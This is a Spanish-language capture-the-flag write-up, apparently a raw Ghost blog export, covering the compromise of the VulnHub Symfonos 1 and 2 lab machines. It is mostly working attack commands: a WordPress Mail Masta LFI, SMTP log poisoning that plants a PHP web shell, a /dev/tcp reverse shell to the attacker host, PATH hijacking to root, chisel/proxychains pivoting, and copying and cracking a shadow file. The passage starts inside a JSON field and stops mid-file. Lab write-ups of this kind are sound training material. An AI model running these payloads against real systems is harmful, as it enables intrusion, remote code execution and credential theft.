abiertos.\"]]],[10,5],[1,\"p\",[[0,[],0,\"Y vemos el archivo targeted para mirar un poco el resultado.\"]]],[10,6],[1,\"p\",[[0,[],0,\"He omitido el output para quedarme con lo interesante. Servicios de \"],[0,[0],1,\"ssh\"],[0,[],0,\", \"],[0,[0],1,\"smtp\"],[0,[],0,\", \"],[0,[0],1,\"http \"],[0,[],0,\"y \"],[0,[0],1,\"smb \"],[0,[],0,\"expuestos.\"]]],[1,\"p\",[[0,[],0,\"Mediante \"],[0,[0],1,\"smbmap\"],[0,[],0,\", intentamos obtener acceso a los recursos compartidos a ver si está todo bien configurado.\"]]],[10,7],[1,\"p\",[[0,[],0,\"Si cateamos el archivo de texto obtenemos lo siguiente.\"]]],[10,8],[1,\"p\",[[0,[],0,\"Cosas interesantes hasta aquí, de atrás adelante.\"]]],[3,\"ul\",[[[0,[],0,\"Las contraseñas 'epidioko', 'qwerty' y 'baseball' son contraseñas que debería tener en cuenta para continuar con el reto.\"]],[[0,[],0,\"Por otro lado, hay un recurso compartido llamado 'helios' -> 'Helios personal', que me puede hacer pensar que hay un usuario llamado helios.\"],[1,[],0,0],[0,[],0,\"Vamos a intentar loguearnos a \"],[0,[0],1,\"smb \"],[0,[],0,\"con el usuario 'helios' y cualquiera de esas 3 contraseñas.\"]]]],[10,9],[1,\"p\",[[0,[],0,\"Tirando del hilo como anteriormente, he encontrado dos archivos. Un research.txt y un todo.txt.\"],[1,[],0,1],[0,[],0,\"El texto de todo.txt es el siguiente.\"]]],[10,10],[1,\"p\",[[0,[],0,\"El tercer punto parece un directorio o una ruta. Si accedo por Firefox a la web expuesta y pongo esa ruta, vemos un servidor Wordpress. Coloco la siguiente entrada en \"],[0,[1],1,\"/etc/hosts\"],[0,[],0,\" para que los archivos estáticos se descarguen correctamente y poderlo visualizar correctamente.\"]]],[10,11],[10,12],[1,\"p\",[[0,[],0,\"A partir de aquí podríamos utilizar \"],[0,[0],1,\"WpScan\"],[0,[],0,\", pero vamos a intentar enumerar posibles plugins que pueda tener instalados y buscar vulnerabilidades en ellos.\"]]],[1,\"p\",[[0,[],0,\"Con la salida de curl, concatenando varios greps y algunos delimitadores, obtenemos la siguiente entrada:\"]]],[10,13],[1,\"p\",[[0,[],0,\"Hay un plugin de mails y otro bastante común para la edición del sitio. Recordamos que la máquina tiene expuesto el puerto de 25 SMTP. Vamos a ir por ese camino.\"]]],[1,\"p\",[[0,[],0,\"Buscamos vulnerabilidades en \"],[0,[0],1,\"searchsploit\"],[0,[],0,\".\"]]],[10,14],[1,\"p\",[[0,[],0,\"El plugin Mail Masta tiene una vulnerabilidad de tipo LFI.\"],[1,[],0,2],[0,[],0,\"Mirando el script, vemos que la vulnerabilidad se encuentra en una URL. Vamos a probarlo manualmente con curl.\"]]],[10,15],[1,\"p\",[[0,[],0,\"Podemos desarrollar un script para hacer más sencillas las consultas como [[lfi_read_file.sh]]\"],[1,[],0,3],[0,[],0,\"Un directorio interesante continuando con el tema de \"],[0,[0],1,\"smtp\"],[0,[],0,\", es \"],[0,[1],1,\"/var/mail/<username>\"],[0,[],0,\".\"],[1,[],0,4],[0,[],0,\"Con ayuda del script, vemos dicho archivo.\"]]],[10,16],[1,\"h2\",[[0,[],0,\"Log Poisoning de SMTP\"]]],[1,\"p\",[[0,[],0,\"El directorio \"],[0,[2],1,\"/var/mail/helios\"],[0,[],0,\" está expuesto. Si fuésemos capaces de enviar un mail y colar código PHP en él, podríamos mediante el \"],[0,[0],1,\"LFI \"],[0,[],0,\"transformarlo en un \"],[0,[0],1,\"RCE \"],[0,[],0,\"fácilmente.\"]]],[1,\"p\",[[0,[],0,\"Vamos a conectarnos por telnet al puerto del mail y tratar de enviar algo.\"]]],[10,17],[1,\"p\",[[0,[],0,\"De este modo, vamos a entablarnos una reverse shell.\"]]],[10,18],[10,19],[10,20],[1,\"h2\",[[0,[],0,\"Symfonos 1: Escalado\"]]],[1,\"p\",[[0,[],0,\"Buscamos archivos SUID que permitan ejecutar código con permisos root.\"]]],[10,21],[1,\"p\",[[0,[],0,\"Llama la atención el archivo \"],[0,[2],1,\"/opt/statuscheck\"],[0,[],0,\". Vamos a inspeccionarlo más\"]]],[10,22],[1,\"p\",[[0,[],0,\"Hace uso del comando curl de forma relativa. Vamos a aplicar \"],[0,[0],1,\"Path Hijacking\"],[0,[],0,\".\"]]],[1,\"h2\",[[0,[],0,\"Path Hijacking\"]]],[1,\"p\",[[0,[],0,\"Creamos un archivo en la carpeta \"],[0,[1],1,\"/tmp\"],[0,[],0,\" llamado curl, hacemos que ejecute el siguiente comando para darle privilegios \"],[0,[0],1,\"SUID \"],[0,[],0,\"a \"],[0,[2],1,\"/bin/bash\"],[0,[],0,\".\"]]],[10,23],[1,\"p\",[[0,[],0,\"Añadimos \"],[0,[1],1,\"/tmp\"],[0,[],0,\" dentro de la variable \"],[0,[2],1,\"$PATH\"],[0,[],0,\" asignándole prioridad.\"]]],[10,24],[1,\"p\",[[0,[],0,\"Y ejecutamos el archivo \"],[0,[2],1,\"statuscheck\"],[0,[],0,\". Posteriormente, llamamos a \"],[0,[2],1,\"/bin/bash\"],[0,[],0,\" con \"],[0,[2],1,\"-p\"],[0,[],0,\" para lanzarlo con modo privilegiado.\"]]],[10,25],[1,\"p\",[[0,[],0,\"Vamos a enumerar las interfaces que tiene activas.\"]]],[10,26],[1,\"p\",[[0,[],0,\"La interfaz 10.10.10.4 era desconocida hasta ahora. Vamos a mirar su tabla \"],[0,[0],1,\"ARP\"],[0,[],0,\".\"]]],[10,27],[1,\"p\",[[0,[],0,\"Ahí está el host 10.10.10.3 correspondiente a Symfonos 2. A partir de aquí podríamos enumerar los host y puertos con un script, pero vamos a continuar directamente con la máquina Symfonos 2.\"]]],[1,\"h1\",[[0,[],0,\"Symfonos 2\"]]],[1,\"p\",[[0,[],0,\"El procedimiento a continuación es entablar una comunicación desde nuestro equipo atacante, a la red \"],[0,[2],1,\"10.10.10.0/24\"],[0,[],0,\" pasando por la máquina \"],[0,[0],1,\"Symfonos 1\"],[0,[],0,\".\"]]],[10,28],[1,\"h2\",[[0,[],0,\"Entablamos la comunicación\"]]],[1,\"p\",[[0,[],0,\"Nos descargamos \"],[0,[0],1,\"Chisel \"],[0,[],0,\"desde su \"],[0,[3],1,\"Github\"],[0,[],0,\" con \"],[0,[0],1,\"wget\"],[0,[],0,\", y lo compartimos con \"],[0,[0],1,\"Symfonos 1\"],[0,[],0,\".\"]]],[10,29],[1,\"p\",[[0,[],0,\"Y lo compartimos con\"],[0,[0],1,\" Symfonos 1\"],[0,[],0,\".\"]]],[10,30],[1,\"p\",[[0,[],0,\"Arrancamos \"],[0,[0],1,\"chisel \"],[0,[],0,\"en modo servidor en nuestra máquina atacante.\"]]],[10,31],[1,\"p\",[[0,[],0,\"Y desde \"],[0,[0],1,\"Symfonos 1\"],[0,[],0,\", entablamos la comunicación con \"],[0,[0],1,\"Socks5\"],[0,[],0,\".\"]]],[10,32],[1,\"p\",[[0,[],0,\"Por último, en nuestra máquina atacante, debemos configurar \"],[0,[0],1,\"Proxychains \"],[0,[],0,\"para que sea capaz de tunelizar las peticiones a través de\"],[0,[0],1,\" Symfonos 1\"],[0,[],0,\".\"]]],[10,33],[1,\"h2\",[[0,[],0,\"Enumeración de Symfonos 2\"]]],[1,\"p\",[[0,[],0,\"Ejecutamos \"],[0,[0],1,\"nmap \"],[0,[],0,\"como al inicio, wrappeando la comunicación a través de \"],[0,[0],1,\"Proxychains\"],[0,[],0,\".\"]]],[10,34],[10,35],[1,\"p\",[[0,[],0,\"Se concatenan además unos comandos de limpieza porque \"],[0,[0],1,\"Proxychains \"],[0,[],0,\"imprime más contenido del deseado. Los puertos abiertos son los siguientes: 21, 22, 80, 139, 445.\"]]],[1,\"p\",[[0,[],0,\"Afinamos la búsqueda.\"]]],[10,36],[1,\"p\",[[0,[],0,\"Si nos comunicamos con Samba, vemos de nuevo que el acceso anónimo está permitido y nos encontramos un archivo log.txt que parece interesante.\"]]],[10,37],[1,\"p\",[[0,[],0,\"Si lo examinamos, nos encontramos con lo siguiente (se han omitido cosas que no eran interesantes).\"]]],[10,38],[3,\"ul\",[[[0,[],0,\"Existe una copia del \"],[0,[2],1,\"shadow \"],[0,[],0,\"en \"],[0,[2],1,\"/var/backups/shadow.bak\"],[0,[],0,\".\"]],[[0,[],0,\"Existe el usuario \"],[0,[0],1,\"aeolus\"]],[[0,[],0,\"El path \"],[0,[2],1,\"/home/aeolus/share\"],[0,[],0,\" es visible de forma anónima por samba. Probablemente, ese sea el directorio donde estamos encontrando el archivo, este que acabamos de leer.\"]]]],[1,\"p\",[[0,[],0,\"A través de \"],[0,[0],1,\"smb \"],[0,[],0,\"no se puede hacer nada más.\"]]],[1,\"p\",[[0,[],0,\"Continuamos por \"],[0,[0],1,\"FTP \"],[0,[],0,\"en el puerto 21.\"]]],[1,\"h2\",[[0,[],0,\"ProFTPD 1.3.5 exploit\"]]],[1,\"p\",[[0,[0],1,\"Searchsploit \"],[0,[],0,\"nos arroja información sobre esta versión de \"],[0,[0],1,\"ftp\"],[0,[],0,\". Parece ser vulnerable\"]]],[10,39],[1,\"p\",[[0,[],0,\"Podemos copiar y pegar archivos de forma remota. Teniendo en cuenta que por \"],[0,[0],1,\"SMB \"],[0,[],0,\"somos capaces de leer el directorio \"],[0,[2],1,\"/home/aeolus/share\"],[0,[],0,\", podemos aprovechar esto para copiar ahí el backup del archivo\"],[0,[2],1,\" /etc/shadow\"],[0,[],0,\".\"]]],[10,40],[1,\"p\",[[0,[],0,\"Ya estamos listos para descargarnos el archivo con \"],[0,[0],1,\"smb\"],[0,[],0,\".\"]]],[10,41],[1,\"p\",[[0,[],0,\"Vamos a probar con un poco de fuerza bruta, a ver si somos capaces de descifrar los hashes.\"]]],[1,\"h2\",[[0,[],0,\"JohnTheRipper > Shadow\"]]],[10,42],[1,\"p\",[[0,[],0,\"Parece que tenemos la contraseña del usuario \"],[0,[1],1,\"aeolus\"],[0,[],0,\", \"],[0,[1],1,\"sergioteamo\"],[0,[],0,\".\"]]],[10,43],[1,\"p\",[[0,[],0,\"Estamos dentro de la máquina \"],[0,[0],1,\"Symfonos 2\"],[0,[],0,\".\"]]],[1,\"h2\",[[0,[],0,\"Symfonos 2: Escalado\"]]],[1,\"p\",[[0,[],0,\"Con el comando \"],[0,[1],1,\"ss\"],[0,[],0,\", buscamos conexiones de red expuestas.\"]]],[10,44],[1,\"p\",[[0,[],0,\"Parece ser que hay algo expuesto en el puerto 8080 del \"],[0,[2],1,\"localhost \"],[0,[],0,\"de la máquina \"],[0,[0],1,\"Symfonos 2\"],[0,[],0,\".\"],[1,[],0,5],[0,[],0,\"Para poder acceder a ella, necesitamos redireccionar en nuestro equipo dicho puerto mediante un túnel \"],[0,[0],1,\"SSH\"],[0,[],0,\".\"]]],[1,\"p\",[[0,[],0,\"Con el siguiente comando vamos a ello.\"]]],[10,45],[1,\"p\",[[0,[],0,\"Una vez hecho esto, abrimos \"],[0,[0],1,\"firefox \"],[0,[],0,\"y accedemos a \"],[0,[4,2],2,\"http://localhost:8080\"],[0,[],0,\".\"]]],[10,46],[1,\"p\",[[0,[],0,\"Dado que tenemos las credenciales del usuario \"],[0,[0],1,\"aeolus\"],[0,[],0,\", vamos a ver si podemos reutilizarlas en esta ventana de login.\"]]],[10,47],[1,\"p\",[[0,[],0,\"Una vez dentro, buscamos alguna vulnerabilidad en este \"],[0,[0],1,\"CMS\"],[0,[],0,\".\"]]],[10,48],[1,\"p\",[[0,[],0,\"El script genera un \"],[0,[0],1,\"RCE \"],[0,[],0,\"por SNMP cuando crea un dispositivo. Con ayuda de él y poniéndonos en escucha desde\"],[0,[0],1,\" Symfonos 1\"],[0,[],0,\".\"]]],[10,49],[1,\"p\",[[0,[],0,\"Pero vamos a complicarlo un poco más. Vamos a entablar una reverse shell hacia mi máquina atacante. Para ello, haremos uso de Socat.\"]]],[1,\"p\",[[0,[],0,\"Desde \"],[0,[0],1,\"Symfonos 1\"],[0,[],0,\", ejecutamos el siguiente comando.\"]]],[10,50],[1,\"p\",[[0,[],0,\"De esta manera, lo que haremos desde \"],[0,[0],1,\"Symfonos 1\"],[0,[],0,\", es que todo el tráfico que le llegue por el puerto 4646, lo redirigirá automáticamente al host \"],[0,[2],1,\"192.168.1.138\"],[0,[],0,\", que es el de mi máquina atacante.\"]]],[10,51],[1,\"p\",[[0,[],0,\"Adecuamos la TTY con un \"],[0,[5],1,\"tratamiento \"],[0,[],0,\"para poder utilizar el Ctrl+C, Ctrl+L y las flechas durante la sesión de la shell.\"]]],[1,\"p\",[[0,[],0,\"Aún queda ganar privilegios de root. Buscamos si tenemos permisos en la configuración de sudoers.\"]]],[10,52],[1,\"p\",[[0,[],0,\"Cuando encontramos este tipo de permisos, conviene visitar \"],[0,[6],1,\"https://gtfobins.github.io/\"],[0,[],0,\" a ver si, de alguna manera, podemos acceder a la consola de root directamente.\"]]],[1,\"p\",[[0,[],0,\"En este caso, con el siguiente comando ejecutándolo como sudo, parece suficiente.\"]]],[10,53],[1,\"p\",[]]],\"ghostVersion\":\"4.0\"}",
            "lexical": null,
            "html": "<p>Máquinas <strong>easy </strong>y <strong>medium</strong>, donde aprovechamos la técnica del <strong>pivoting </strong>para saltar entre ellas y llegar a la prueba final. Enumeramos mucho, nos aprovechamos de <strong>smbmap</strong>, un plugin de mail de Wordpress, <strong>Log Poisoning</strong>, <strong>Path Hijacking</strong>, vulnerabilidad de <strong>FTP</strong>, <strong>BruteForce </strong>del archivo shadow, LibreNMS vulnerable y posibilidad de ejecutar MySQL como sudo.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2023/01/Symfonos-Network.svg\" class=\"kg-image\" alt loading=\"lazy\" width=\"1054\" height=\"279\"></figure><h1 id=\"symfonos-1\">Symfonos 1</h1><h2 id=\"primeros-pasos\">Primeros pasos</h2><p>En este caso, desconocemos la IP de la máquina. Lo primero que vamos a hacer es recoger los host visibles desde mi equipo cacheados en la tabla ARP. Una alternativa sería utilizar <strong>ArpScan</strong>.</p><pre><code class=\"language-bash\">cat /proc/net/arp\n# IP address       HW type     Flags       HW address            Mask     Device\n# 192.168.1.140    0x1         0x2         08:00:27:5a:60:b1     *        enp0s3\n# 192.168.1.137    0x1         0x0         00:00:00:00:00:00     *        enp0s3\n</code></pre><p>La IP 192.168.1.140 es nuestro objetivo ahora.</p><p>Con un ping, obtenemos el TTL para saber si se refiere a una máquina Linux o una Windows.</p><pre><code class=\"language-bash\">ping -c 1 192.168.1.140 -R\n# PING 192.168.1.140 (192.168.1.140) 56(124) bytes of data.\n# 64 bytes from 192.168.1.140: icmp_seq=1 ttl=64 time=0.420 ms\n# RR: \t192.168.1.138\n# \t    192.168.1.140\n# \t    192.168.1.140\n#\t    192.168.1.138\n</code></pre><div class=\"kg-card kg-callout-card kg-callout-card-yellow\"><div class=\"kg-callout-emoji\">⚠️</div><div class=\"kg-callout-text\">TTL~64 -&gt; Linux</div></div><h2 id=\"reconocimiento\">Reconocimiento</h2><p>Mediante <strong>nmap </strong>escaneamos los puertos abiertos.</p><pre><code class=\"language-bash\">nmap -p- -sS -vvv --open -n -Pn --min-rate 5000 192.168.1.140 -oG allPorts\n# Open ports: 22,25,80,139,445\n</code></pre><p>Afinamos la búsqueda una vez conocidos los puertos abiertos.</p><pre><code class=\"language-bash\">nmap -p22,25,80,139,445 -sCV 192.168.1.140 -oN targeted\n</code></pre><p>Y vemos el archivo targeted para mirar un poco el resultado.</p><pre><code class=\"language-java\"># Nmap 7.92 scan initiated Sat Jan 14 11:57:45 2023 as: nmap -p22,25,80,139,445 -sCV -oN targeted 192.168.1.140\nNmap scan report for symfonos.local (192.168.1.140)\nHost is up (0.00047s latency).\nPORT    STATE SERVICE     VERSION\n22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)\n...\n25/tcp  open  smtp        Postfix smtpd\n...\n80/tcp  open  http        Apache httpd 2.4.25 ((Debian))\n...\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)\nMAC Address: 08:00:27:5A:60:B1 (Oracle VirtualBox virtual NIC)\n...\n</code></pre><p>He omitido el output para quedarme con lo interesante. Servicios de <strong>ssh</strong>, <strong>smtp</strong>, <strong>http </strong>y <strong>smb </strong>expuestos.</p><p>Mediante <strong>smbmap</strong>, intentamos obtener acceso a los recursos compartidos a ver si está todo bien configurado.</p><pre><code class=\"language-bash\">smbmap -H 192.168.1.140\n# [+] Guest session   \tIP: 192.168.1.140:445\tName: symfonos.local                                    \n#         Disk                                           \tPermissions\tComment\n#         ----                                             \t-----------\t-------\n# \t\tprint$                                            \tNO ACCESS\tPrinter Drivers\n# \t\thelios                                            \tNO ACCESS\tHelios personal share\n#    \tanonymous                                         \tREAD ONLY\t\n#     \tIPC$                                              \tNO ACCESS\tIPC Service\nsmbmap -H 192.168.1.140 -r anonymous\n# [+] Guest session   \tIP: 192.168.1.140:445\tName: symfonos.local                                    \n#\tanonymous                                         \tREAD ONLY\t\n#\t.\\anonymous\\*\n#\tdr--r--r--                0 Sat Jun 29 03:14:49 2019\t.\n#\tdr--r--r--                0 Sat Jun 29 03:12:15 2019\t..\n#\tfr--r--r--              154 Sat Jun 29 03:14:49 2019\tattention.txt\nsmbmap -H 192.168.1.140 --download anonymous/attention.txt\n# [+] Starting download: anonymous\\attention.txt (154 bytes)\n# [+] File output to: /home/iocio/Desktop/VulnHub/Symfonos1/content/192.168.1.140-anonymous_attention.txt\n</code></pre><p>Si cateamos el archivo de texto obtenemos lo siguiente.</p><pre><code class=\"language-bash\">Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! \n\nNext person I find using one of these passwords will be fired!\n\n-Zeus\n</code></pre><p>Cosas interesantes hasta aquí, de atrás adelante.</p><ul><li>Las contraseñas 'epidioko', 'qwerty' y 'baseball' son contraseñas que debería tener en cuenta para continuar con el reto.</li><li>Por otro lado, hay un recurso compartido llamado 'helios' -&gt; 'Helios personal', que me puede hacer pensar que hay un usuario llamado helios.<br>Vamos a intentar loguearnos a <strong>smb </strong>con el usuario 'helios' y cualquiera de esas 3 contraseñas.</li></ul><pre><code class=\"language-bash\">smbmap -H 192.168.1.140 -u helios -p qwerty\n# [+] IP: 192.168.1.140:445\tName: symfonos.local                                    \n#        Disk                                                  \tPermissions\tComment\n#     \t----                                                  \t-----------\t-------\n#   \tprint$                                            \tREAD ONLY\tPrinter Drivers\n#   \thelios                                            \tREAD ONLY\tHelios personal #   \tanonymous                                         \tREAD ONLY\t\n#   \tIPC$                                              \tNO ACCESS\tIPC Service\n</code></pre><p>Tirando del hilo como anteriormente, he encontrado dos archivos. Un research.txt y un todo.txt.<br>El texto de todo.txt es el siguiente.</p><pre><code class=\"language-bash\">1. Binge watch Dexter\n2. Dance\n3. Work on /h3l105\n</code></pre><p>El tercer punto parece un directorio o una ruta. Si accedo por Firefox a la web expuesta y pongo esa ruta, vemos un servidor Wordpress. Coloco la siguiente entrada en <code>/etc/hosts</code> para que los archivos estáticos se descarguen correctamente y poderlo visualizar correctamente.</p><pre><code class=\"language-bash\">192.168.1.140    symfonos.local\n</code></pre><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2023/01/Helios-Wordpress.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"818\" height=\"880\" srcset=\"__GHOST_URL__/content/images/size/w600/2023/01/Helios-Wordpress.png 600w, __GHOST_URL__/content/images/2023/01/Helios-Wordpress.png 818w\" sizes=\"(min-width: 720px) 720px\"></figure><p>A partir de aquí podríamos utilizar <strong>WpScan</strong>, pero vamos a intentar enumerar posibles plugins que pueda tener instalados y buscar vulnerabilidades en ellos.</p><p>Con la salida de curl, concatenando varios greps y algunos delimitadores, obtenemos la siguiente entrada:</p><pre><code class=\"language-bash\">curl -X get 192.168.1.140/h3l105/ | grep 'wp-content' | grep -oP \"'.*?'\" | grep symfonos.local | cut -d '/' -f 1-7 | sort -u | grep plugins\n# 'http://symfonos.local/h3l105/wp-content/plugins/mail-masta\n# 'http://symfonos.local/h3l105/wp-content/plugins/site-editor\n</code></pre><p>Hay un plugin de mails y otro bastante común para la edición del sitio. Recordamos que la máquina tiene expuesto el puerto de 25 SMTP. Vamos a ir por ese camino.</p><p>Buscamos vulnerabilidades en <strong>searchsploit</strong>.</p><pre><code class=\"language-bash\">searchsploit mail masta\n# WordPress Plugin Mail Masta 1.0 - Local File Inclusion (2)                                                                                                  | php/webapps/50226.py\n</code></pre><p>El plugin Mail Masta tiene una vulnerabilidad de tipo LFI.<br>Mirando el script, vemos que la vulnerabilidad se encuentra en una URL. Vamos a probarlo manualmente con curl.</p><pre><code>curl -X GET \"http://192.168.1.140/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd\"\n# root:x:0:0:root:/root:/bin/bash\n# helios:x:1000:1000:,,,:/home/helios:/bin/bash \n</code></pre><p>Podemos desarrollar un script para hacer más sencillas las consultas como [[lfi_read_file.sh]]<br>Un directorio interesante continuando con el tema de <strong>smtp</strong>, es <code>/var/mail/&lt;username&gt;</code>.<br>Con ayuda del script, vemos dicho archivo.</p><pre><code class=\"language-bash\">./lfi_read_file.sh -f /var/mail/helios\n</code></pre><h2 id=\"log-poisoning-de-smtp\">Log Poisoning de SMTP</h2><p>El directorio <em>/var/mail/helios</em> está expuesto. Si fuésemos capaces de enviar un mail y colar código PHP en él, podríamos mediante el <strong>LFI </strong>transformarlo en un <strong>RCE </strong>fácilmente.</p><p>Vamos a conectarnos por telnet al puerto del mail y tratar de enviar algo.</p><pre><code class=\"language-bash\">telnet 192.168.1.140 25\n# Connected to 192.168.1.140.\n# Escape character is '^]'.\n# 220 symfonos.localdomain ESMTP Postfix (Debian/GNU)\nMAIL FROM: 0x10\n# 250 2.1.0 Ok\nRCPT TO: helios\n# 250 2.1.5 Ok\nDATA\n# 354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;\n&lt;?php system($_GET['cmd']) ?&gt;\n.\n# 250 2.0.0 Ok: queued as 9ACCB4083E\nquit\n</code></pre><p>De este modo, vamos a entablarnos una reverse shell.</p><pre><code class=\"language-bash\"># attacker\nsudo nc -lvnp 443\nlistening on [any] 443 ...\n</code></pre><pre><code class=\"language-bash\"># vulnerable machine\ncurl -vs -X GET \"http://192.168.1.140/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;cmd=%2Fbin%2Fbash+-c+%22sh+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.1.138%2F443+0%3E%261%22\"\n</code></pre><pre><code class=\"language-bash\"># attacker\n# sudo nc -lvnp 443\n# listening on [any] 443 ...\nconnect to [192.168.1.138] from (UNKNOWN) [192.168.1.140] 54028\nsh: 0: can't access tty; job control turned off\n$ whoami\nhelios\n</code></pre><h2 id=\"symfonos-1-escalado\">Symfonos 1: Escalado</h2><p>Buscamos archivos SUID que permitan ejecutar código con permisos root.</p><pre><code class=\"language-bash\">find \\-perm -4000 2&gt;/dev/null\n# ./usr/lib/eject/dmcrypt-get-device\n# ./usr/lib/dbus-1.0/dbus-daemon-launch-helper\n# ./usr/lib/openssh/ssh-keysign\n# ./usr/bin/passwd\n# ./usr/bin/gpasswd\n# ./usr/bin/newgrp\n# ./usr/bin/chsh\n# ./usr/bin/chfn\n# ./opt/statuscheck\n# ./bin/mount\n# ./bin/umount\n# ./bin/bash\n# ./bin/su\n# ./bin/ping\n</code></pre><p>Llama la atención el archivo <em>/opt/statuscheck</em>. Vamos a inspeccionarlo más</p><pre><code class=\"language-bash\">strings /opt/statuscheck\n# ...\n# _ITM_registerTMCloneTable\n# GLIBC_2.2.5\n# curl -I H\n# http://lH\n# ocalhostH\n# AWAVA\n# AUATL\n# ...\n</code></pre><p>Hace uso del comando curl de forma relativa. Vamos a aplicar <strong>Path Hijacking</strong>.</p><h2 id=\"path-hijacking\">Path Hijacking</h2><p>Creamos un archivo en la carpeta <code>/tmp</code> llamado curl, hacemos que ejecute el siguiente comando para darle privilegios <strong>SUID </strong>a <em>/bin/bash</em>.</p><pre><code class=\"language-bash\">chmod u+s /bin/bash\n</code></pre><p>Añadimos <code>/tmp</code> dentro de la variable <em>$PATH</em> asignándole prioridad.</p><pre><code class=\"language-bash\">export PATH=/tmp:$PATH\n</code></pre><p>Y ejecutamos el archivo <em>statuscheck</em>. Posteriormente, llamamos a <em>/bin/bash</em> con <em>-p</em> para lanzarlo con modo privilegiado.</p><pre><code class=\"language-bash\">sudo /opt/statuscheck\n/bin/bash -p\nwhoami\n# root\n</code></pre><p>Vamos a enumerar las interfaces que tiene activas.</p><pre><code class=\"language-bash\">hostname -I\n10.10.10.4 192.168.1.140\n</code></pre><p>La interfaz 10.10.10.4 era desconocida hasta ahora. Vamos a mirar su tabla <strong>ARP</strong>.</p><pre><code class=\"language-bash\">cat /proc/net/arp\nash-4.4# cat /proc/net/arp\nIP address       HW type     Flags       HW address            Mask     Device\n10.10.10.3       0x1         0x2         08:00:27:44:fe:76     *        enp0s8\n192.168.1.138    0x1         0x2         08:00:27:40:1b:d1     *        enp0s17\n192.168.1.1      0x1         0x2         b0:8b:92:fa:45:dc     *        enp0s17\n192.168.1.136    0x1         0x2         68:b6:91:4e:42:0c     *        enp0s17\n</code></pre><p>Ahí está el host 10.10.10.3 correspondiente a Symfonos 2. A partir de aquí podríamos enumerar los host y puertos con un script, pero vamos a continuar directamente con la máquina Symfonos 2.</p><h1 id=\"symfonos-2\">Symfonos 2</h1><p>El procedimiento a continuación es entablar una comunicación desde nuestro equipo atacante, a la red <em>10.10.10.0/24</em> pasando por la máquina <strong>Symfonos 1</strong>.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2023/01/Symfonos-Proxychains.svg\" class=\"kg-image\" alt loading=\"lazy\" width=\"1039\" height=\"382\"></figure><h2 id=\"entablamos-la-comunicaci%C3%B3n\">Entablamos la comunicación</h2><p>Nos descargamos <strong>Chisel </strong>desde su <a href=\"https://github.com/jpillora/chisel/releases\">Github</a> con <strong>wget</strong>, y lo compartimos con <strong>Symfonos 1</strong>.</p><pre><code class=\"language-bash\">wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz\ngunzip chisel_1.7.7_linux_amd64.gz\nmv chisel_1.7.7_linux_amd64 chisel\npython -m http.server 8080\n</code></pre><p>Y lo compartimos con<strong> Symfonos 1</strong>.</p><pre><code class=\"language-bash\">wget 192.168.1.138:8080/chisel\n</code></pre><p>Arrancamos <strong>chisel </strong>en modo servidor en nuestra máquina atacante.</p><pre><code class=\"language-bash\">chisel server --reverse -p 1234\n</code></pre><p>Y desde <strong>Symfonos 1</strong>, entablamos la comunicación con <strong>Socks5</strong>.</p><pre><code class=\"language-bash\">chisel client 192.168.1.138:1234 R:socks\n# When connection is stablished, chisel server output\n# 2023/01/13 23:32:12 server: session#3: tun: proxy#R:127.0.0.1:1080=&gt;socks: Listening\n</code></pre><p>Por último, en nuestra máquina atacante, debemos configurar <strong>Proxychains </strong>para que sea capaz de tunelizar las peticiones a través de<strong> Symfonos 1</strong>.</p><pre><code class=\"language-bash\">nano /etc/proxychains.conf\n#[ProxyList]\n# add proxy here ...\n# meanwile\n# defaults set to \"tor\"\n#socks4     127.0.0.1 9050\nsocks5 127.0.0.1 1080 # this port depends on Chisel result\n</code></pre><h2 id=\"enumeraci%C3%B3n-de-symfonos-2\">Enumeración de Symfonos 2</h2><p>Ejecutamos <strong>nmap </strong>como al inicio, wrappeando la comunicación a través de <strong>Proxychains</strong>.</p><pre><code class=\"language-bash\">proxychains nmap --top-ports 50 -sT -vvv --open -n -Pn --min-rate 5000 10.10.10.3 -oG allPorts 2&gt;&amp;1 | grep -vE \"timeout|OK\"\n</code></pre><div class=\"kg-card kg-callout-card kg-callout-card-red\"><div class=\"kg-callout-emoji\">⚠️</div><div class=\"kg-callout-text\">Recuerda que con <strong>Proxychains</strong>, no se puede utilizar la opción<em> -sS</em> porque entra en conflicto con el túnel. Hay que cambiar el parámetro a <em>-sT</em> para utilizar peticiones TCP normales.</div></div><p>Se concatenan además unos comandos de limpieza porque <strong>Proxychains </strong>imprime más contenido del deseado. Los puertos abiertos son los siguientes: 21, 22, 80, 139, 445.</p><p>Afinamos la búsqueda.</p><pre><code class=\"language-bash\">proxychains nmap -p21,22,80,139,445 --open -T5 -v -n -sTV -Pn 10.10.10.3 -oN targeted 2&gt;&amp;1 | grep -vE \"OK\"\n# PORT    STATE SERVICE     VERSION\n# 21/tcp  open  ftp         ProFTPD 1.3.5\n# 22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)\n# 80/tcp  open  http        WebFS httpd 1.21\n# 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n# 445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n# Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre><p>Si nos comunicamos con Samba, vemos de nuevo que el acceso anónimo está permitido y nos encontramos un archivo log.txt que parece interesante.</p><pre><code class=\"language-bash\">proxychains smbmap -H 10.10.10.3 --download anonymous/backups/log.txt\n</code></pre><p>Si lo examinamos, nos encontramos con lo siguiente (se han omitido cosas que no eran interesantes).</p><pre><code class=\"language-bash\">root@symfonos2:~# cat /etc/shadow &gt; /var/backups/shadow.bak\nroot@symfonos2:~# cat /etc/samba/smb.conf\n#\n# Sample 